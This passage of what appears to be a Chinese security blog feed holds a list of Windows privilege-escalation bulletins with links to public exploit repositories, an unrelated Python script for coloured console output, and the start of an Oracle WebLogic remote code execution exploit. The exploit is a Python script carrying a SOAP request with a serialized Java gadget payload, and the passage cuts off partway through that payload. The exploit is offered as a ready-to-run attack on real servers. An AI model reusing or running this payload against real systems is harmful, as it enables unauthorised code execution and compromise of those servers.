class="line">MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</span><br><span class="line">MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP)</span><br><span class="line">MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7/2008R2)</span><br><span class="line">MS09-050 [<span class="string">KB975517</span>][<span class="symbol">Remote Code Execution</span>] (2008/Vista)</span><br><span class="line">MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0)</span><br><span class="line">MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista)</span><br><span class="line">MS08-068 [KB957097] [Remote Code Execution] (2000/XP)</span><br><span class="line">MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008)</span><br><span class="line">MS08-066 [] [] (Windows 2000/XP/Server 2003)</span><br><span class="line">MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista)</span><br><span class="line">MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000)</span><br><span class="line">MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003)</span><br><span class="line">MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)</span><br></pre></td></tr></table></figure><h3 id="已对外公开exp注："><a href="#已对外公开exp注：" class="headerlink" title="已对外公开exp注："></a>已对外公开exp注：</h3><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://github.com/WindowsExploits/Exploits" target="_blank" rel="noopener">https://github.com/WindowsExploits/Exploits</a><br><a href="https://github.com/AusJock/Privilege-Escalation" target="_blank" rel="noopener">https://github.com/AusJock/Privilege-Escalation</a></p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Django</title>
      <link href="/article/python-django.html"/>
      <url>/article/python-django.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 定义DOS窗口输出颜色</title>
      <link href="/article/python-dos-colour.html"/>
      <url>/article/python-dos-colour.html</url>
      
        <content type="html"><![CDATA[<p>有时候为了养眼，Python输出到DOS窗口的颜色需要稍微修饰。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">import ctypes,sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">STD_INPUT_HANDLE = -10</span><br><span class="line">STD_OUTPUT_HANDLE = -11</span><br><span class="line">STD_ERROR_HANDLE = -12</span><br><span class="line"></span><br><span class="line">#字体颜色定义 ,关键在于颜色编码，由2位十六进制组成，分别取0~f，前一位指的是背景色，后一位指的是字体色</span><br><span class="line">#由于该函数的限制，应该是只有这16种，可以前景色与背景色组合。也可以几种颜色通过或运算组合，组合后还是在这16种颜色中</span><br><span class="line"></span><br><span class="line">#Windows CMD命令行 字体颜色定义</span><br><span class="line">FOREGROUND_BLACK = 0x00 #black.</span><br><span class="line">FOREGROUND_DARKBLUE = 0x01 #暗蓝色</span><br><span class="line">FOREGROUND_DARKGREEN = 0x02 #暗绿色</span><br><span class="line">FOREGROUND_DARKSKYBLUE = 0x03 #暗天蓝色</span><br><span class="line">FOREGROUND_DARKRED = 0x04 #暗红色</span><br><span class="line">FOREGROUND_DARKPINK = 0x05 #暗粉红色</span><br><span class="line">FOREGROUND_DARKYELLOW = 0x06 #暗黄色</span><br><span class="line">FOREGROUND_DARKWHITE = 0x07 #暗白色</span><br><span class="line">FOREGROUND_DARKGRAY = 0x08 #暗灰色</span><br><span class="line">FOREGROUND_BLUE = 0x09 #蓝色</span><br><span class="line">FOREGROUND_GREEN = 0x0a #绿色</span><br><span class="line">FOREGROUND_SKYBLUE = 0x0b #天蓝色</span><br><span class="line">FOREGROUND_RED = 0x0c #红色</span><br><span class="line">FOREGROUND_PINK = 0x0d #粉红色</span><br><span class="line">FOREGROUND_YELLOW = 0x0e #黄色</span><br><span class="line">FOREGROUND_WHITE = 0x0f #白色</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Windows CMD命令行 背景颜色</span><br><span class="line">BACKGROUND_BLUE = 0x10 #暗蓝色</span><br><span class="line">BACKGROUND_GREEN = 0x20 #暗绿色</span><br><span class="line">BACKGROUND_DARKSKYBLUE = 0x30 #暗天蓝色</span><br><span class="line">BACKGROUND_DARKRED = 0x40 #暗红色</span><br><span class="line">BACKGROUND_DARKPINK = 0x50 #暗粉红色</span><br><span class="line">BACKGROUND_DARKYELLOW = 0x60 #暗黄色</span><br><span class="line">BACKGROUND_DARKWHITE = 0x70 #暗白色</span><br><span class="line">BACKGROUND_DARKGRAY = 0x80 #暗灰色</span><br><span class="line">BACKGROUND_BLUE = 0x90 #蓝色</span><br><span class="line">BACKGROUND_GREEN = 0xa0 #绿色</span><br><span class="line">BACKGROUND_SKYBLUE = 0xb0 #天蓝色</span><br><span class="line">BACKGROUND_RED = 0xc0 #红色</span><br><span class="line">BACKGROUND_PINK = 0xd0 #粉红色</span><br><span class="line">BACKGROUND_YELLOW = 0xe0 #黄色</span><br><span class="line">BACKGROUND_WHITE = 0xf0 #白色</span><br><span class="line"></span><br><span class="line">#get handle</span><br><span class="line">std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)</span><br><span class="line"></span><br><span class="line">def set_cmd_text_color(color, handle=std_out_handle):</span><br><span class="line">    Bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)</span><br><span class="line">    return Bool</span><br><span class="line"></span><br><span class="line">#重置到白色</span><br><span class="line">def resetColor():</span><br><span class="line">    set_cmd_text_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)</span><br><span class="line"></span><br><span class="line">###############################################################</span><br><span class="line"></span><br><span class="line">#暗蓝色</span><br><span class="line">def printDarkBlue(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_DARKBLUE)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#暗绿色</span><br><span class="line">def printDarkGreen(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_DARKGREEN)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#暗天蓝色</span><br><span class="line">def printDarkSkyBlue(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_DARKSKYBLUE)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#暗红色</span><br><span class="line">def printDarkRed(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_DARKRED)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#暗粉红色</span><br><span class="line">def printDarkPink(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_DARKPINK)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#暗黄色</span><br><span class="line">def printDarkYellow(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_DARKYELLOW)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#暗白色</span><br><span class="line">def printDarkWhite(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_DARKWHITE)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#暗灰色</span><br><span class="line">def printDarkGray(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_DARKGRAY)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#蓝色</span><br><span class="line">def printBlue(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_BLUE)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#绿色</span><br><span class="line">def printGreen(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_GREEN)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#天蓝色</span><br><span class="line">def printSkyBlue(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_SKYBLUE)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#红色</span><br><span class="line">def printRed(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_RED)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#粉红色</span><br><span class="line">def printPink(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_PINK)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#黄色</span><br><span class="line">def printYellow(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_YELLOW)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#白色</span><br><span class="line">def printWhite(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_WHITE)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">##################################################</span><br><span class="line"></span><br><span class="line">#白底黑字</span><br><span class="line">def printWhiteBlack(mess):</span><br><span class="line">    set_cmd_text_color(FOREGROUND_BLACK | BACKGROUND_WHITE)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line">#白底黑字</span><br><span class="line">def printWhiteBlack_2(mess):</span><br><span class="line">    set_cmd_text_color(0xf0)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#黄底蓝字</span><br><span class="line">def printYellowRed(mess):</span><br><span class="line">    set_cmd_text_color(BACKGROUND_YELLOW | FOREGROUND_RED)</span><br><span class="line">    sys.stdout.write(mess)</span><br><span class="line">    resetColor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##############################################################</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    printDarkBlue(&apos;printDarkBlue:暗蓝色文字\n&apos;)</span><br><span class="line">    printDarkGreen(&apos;printDarkGreen:暗绿色文字\n&apos;)</span><br><span class="line">    printDarkSkyBlue(&apos;printDarkSkyBlue:暗天蓝色文字\n&apos;)</span><br><span class="line">    printDarkRed(&apos;printDarkRed:暗红色文字\n&apos;)</span><br><span class="line">    printDarkPink(&apos;printDarkPink:暗粉红色文字\n&apos;)</span><br><span class="line">    printDarkYellow(&apos;printDarkYellow:暗黄色文字\n&apos;)</span><br><span class="line">    printDarkWhite(&apos;printDarkWhite:暗白色文字\n&apos;)</span><br><span class="line">    printDarkGray(&apos;printDarkGray:暗灰色文字\n&apos;)</span><br><span class="line">    printBlue(&apos;printBlue:蓝色文字\n&apos;)</span><br><span class="line">    printGreen(&apos;printGreen:绿色文字\n&apos;)</span><br><span class="line">    printSkyBlue(&apos;printSkyBlue:天蓝色文字\n&apos;)</span><br><span class="line">    printRed(&apos;printRed:红色文字\n&apos;)</span><br><span class="line">    printPink(&apos;printPink:粉红色文字\n&apos;)</span><br><span class="line">    printYellow(&apos;printYellow:黄色文字\n&apos;)</span><br><span class="line">    printWhite(&apos;printWhite:白色文字\n&apos;)</span><br><span class="line">    printWhiteBlack(&apos;printWhiteBlack:白底黑字输出\n&apos;)</span><br><span class="line">    printWhiteBlack_2(&apos;printWhiteBlack_2:白底黑字输出\n&apos;)</span><br><span class="line">    printYellowRed(&apos;printYellowRed:黄底红字输出\n&apos;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>漏洞库</title>
      <link href="/article/vulnerability-library.html"/>
      <url>/article/vulnerability-library.html</url>
      
        <content type="html"><![CDATA[<p>记录的一些漏洞及EXP。</p><h6 id="2019-06-15-Oracle-WebLogic-Server-远程代码执行漏洞"><a href="#2019-06-15-Oracle-WebLogic-Server-远程代码执行漏洞" class="headerlink" title="2019-06-15 Oracle WebLogic Server 远程代码执行漏洞"></a>2019-06-15 Oracle WebLogic Server 远程代码执行漏洞</h6><hr><blockquote><p>test.py <a href="http://127.0.0.7001" target="_blank" rel="noopener">http://127.0.0.7001</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">echo_cmd_payload_10_3_6 = <span class="string">"""&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;   &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; </span></span><br><span class="line"><span class="string">&lt;java&gt;&lt;class&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;&lt;void&gt;</span></span><br><span class="line"><span class="string"> &lt;array class="byte" length="6857"&gt;&lt;void index="0"&gt; &lt;byte&gt;-84&lt;/byte&gt;&lt;/void&gt;&lt;void index="1"&gt; &lt;byte&gt;-19&lt;/byte&gt;&lt;/void&gt;&lt;void index="3"&gt; &lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="4"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="7"&gt; &lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="8"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="9"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="10"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="11"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="12"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="13"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="14"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="15"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="16"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="17"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="18"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="19"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="20"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="21"&gt; &lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="22"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="23"&gt; &lt;byte&gt;100&lt;/byte&gt;&lt;/void&gt;&lt;void index="24"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="25"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="26"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="27"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="28"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="29"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="30"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="31"&gt; &lt;byte&gt;-40&lt;/byte&gt;&lt;/void&gt;&lt;void index="32"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="33"&gt; &lt;byte&gt;-41&lt;/byte&gt;&lt;/void&gt;&lt;void index="34"&gt; &lt;byte&gt;90&lt;/byte&gt;&lt;/void&gt;&lt;void index="35"&gt; &lt;byte&gt;-107&lt;/byte&gt;&lt;/void&gt;&lt;void index="36"&gt; &lt;byte&gt;-35&lt;/byte&gt;&lt;/void&gt;&lt;void index="37"&gt; &lt;byte&gt;42&lt;/byte&gt;&lt;/void&gt;&lt;void index="38"&gt; &lt;byte&gt;30&lt;/byte&gt;&lt;/void&gt;&lt;void index="39"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="42"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="43"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="45"&gt; &lt;byte&gt;17&lt;/byte&gt;&lt;/void&gt;&lt;void index="46"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="47"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="48"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="49"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="50"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="51"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="52"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="53"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="54"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="55"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="56"&gt; &lt;byte&gt;72&lt;/byte&gt;&lt;/void&gt;&lt;void index="57"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="58"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="59"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="60"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="61"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="62"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="63"&gt; &lt;byte&gt;-70&lt;/byte&gt;&lt;/void&gt;&lt;void index="64"&gt; &lt;byte&gt;68&lt;/byte&gt;&lt;/void&gt;&lt;void index="65"&gt; &lt;byte&gt;-123&lt;/byte&gt;&lt;/void&gt;&lt;void index="66"&gt; &lt;byte&gt;-107&lt;/byte&gt;&lt;/void&gt;&lt;void index="67"&gt; &lt;byte&gt;-106&lt;/byte&gt;&lt;/void&gt;&lt;void index="68"&gt; &lt;byte&gt;-72&lt;/byte&gt;&lt;/void&gt;&lt;void index="69"&gt; &lt;byte&gt;-73&lt;/byte&gt;&lt;/void&gt;&lt;void index="70"&gt; &lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="71"&gt; &lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="74"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="75"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="76"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="77"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="81"&gt; &lt;byte&gt;16&lt;/byte&gt;&lt;/void&gt;&lt;void index="82"&gt; &lt;byte&gt;63&lt;/byte&gt;&lt;/void&gt;&lt;void index="83"&gt; &lt;byte&gt;64&lt;/byte&gt;&lt;/void&gt;&lt;void index="89"&gt; &lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="90"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="91"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="93"&gt; &lt;byte&gt;58&lt;/byte&gt;&lt;/void&gt;&lt;void index="94"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="95"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="96"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="97"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="98"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="99"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="100"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="101"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="102"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="103"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="104"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="105"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="106"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="107"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="108"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="109"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="110"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="111"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="112"&gt; &lt;byte&gt;46&lt;/byte&gt;&lt;/void&gt;&lt;void index="113"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="114"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="115"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="116"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void 